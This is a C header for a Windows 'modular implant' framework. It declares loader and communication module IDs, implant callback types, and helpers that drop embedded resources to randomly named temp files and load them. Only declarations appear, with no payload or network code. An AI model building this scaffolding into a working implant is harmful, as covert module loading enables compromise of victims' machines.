#pragma once

#include <Windows.h>

#include <bcrypt.h>
#pragma comment(lib, "Bcrypt.lib")

#include <strsafe.h>

#define PREFIX_LEN	4

#define LOG(hFileStream, lpMsg)		\
{									\
	WriteFile(hFileStream,			\
		lpMsg  "\r\n",				\
		sizeof(lpMsg),				\
		NULL,						\
		NULL						\
	);								\
}

#define LOG_MSG(lpMsg)		LOG(GetStdHandle(STD_OUTPUT_HANDLE), "[+] " lpMsg "\r\n")
#define LOG_ERROR(lpMsg)	LOG(GetStdHandle(STD_ERROR_HANDLE),	\
	"[!] (" __FUNCTION__ ") " lpMsg "\r\n")

#define CLAMP_WCHAR_TO_UPPER(wChar)	\
	(WCHAR)(((USHORT)wChar % (L'Z' - L'A')) + (L'A'))

enum MODULAR_IMPLANT_RESOURCE_IDS
{
	MIRID_Loader,
	MIRID_Communication
};

typedef struct _LOADED_MODULE
{
	HMODULE	hModule;
	PWSTR	pwszModuleFileName;
} LOADED_MODULE, * PLOADED_MODULE;

typedef VOID(*IMPLANT_FUNC) ();
typedef BOOL(*IMPLANT_LOADER) (_In_ PVOID pModuleData,
	_In_ DWORD cbModuleLen,
	_Out_ PLOADED_MODULE pLoadedModule);

typedef struct _IMPLANT_CONFIG
{
	IMPLANT_LOADER fnLoader;
} IMPLANT_CONFIG, *PIMPLANT_CONFIG;

typedef VOID(*IMPLANT_CALLBACK)(PIMPLANT_CONFIG pImplantConfig,
	IMPLANT_FUNC fnFunc,
	enum MODULAR_IMPLANT_RESOURCE_IDS iFuncType);

BOOL
GetRandomPrefixW(
	PWSTR wszPrefixBuf,
	DWORD cbBufSize);

__declspec(dllexport)
BOOL
GetRandomTempFileNameW(
	PWSTR wszTempFileNameBuf,
	SIZE_T ccFileNameBufSize);

_Success_(return)
BOOL
LoadEmbeddedLoader(
	PLOADED_MODULE pLoadedModule);

__declspec(dllexport)
BOOL
WriteDataToFile(
	LPCWSTR wszFileName,
	PVOID pData,
	DWORD dwDataLen);

__declspec(dllexport)
BOOL
GetResourceData(
	HMODULE hModule,
	INT iResourceId,
	PVOID* ppResourceData,
	PDWORD pdwResourceSize);